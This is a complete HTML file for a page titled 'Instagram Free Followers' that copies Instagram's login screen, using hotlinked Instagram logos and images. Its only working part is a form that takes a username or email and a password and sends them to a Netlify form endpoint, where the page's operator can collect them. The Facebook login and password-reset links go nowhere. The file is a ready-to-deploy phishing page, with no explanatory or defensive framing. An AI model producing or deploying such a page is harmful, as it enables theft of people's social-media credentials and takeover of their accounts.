<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Free Followers</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="phone">
            <img src="https://www.instagram.com/static/images/homepage/phones/home-phones.png/43cc71bb1b43.png" alt="Instagram Phone">
        </div>
        <div class="login-box">
            <div class="logo">
                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram Logo">
            </div>
            <form name="insta" method="POST" data-netlify="true">
                <input type="hidden" name="form-name" value="insta">
                
                
                    <input type="text" name="username_or_email" placeholder="Phone number, username, or email" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Log In</button>
               
            </form>
            <div class="or">OR</div>
            <div class="facebook-login">
                <img src="https://cdn-icons-png.flaticon.com/512/174/174848.png" alt="Facebook Logo">
                <a href="#">Log in with Facebook</a>
            </div>
            <a href="#" class="forgot-password">Forgot Password?</a>
        </div>
    </div>
</body>
</html>
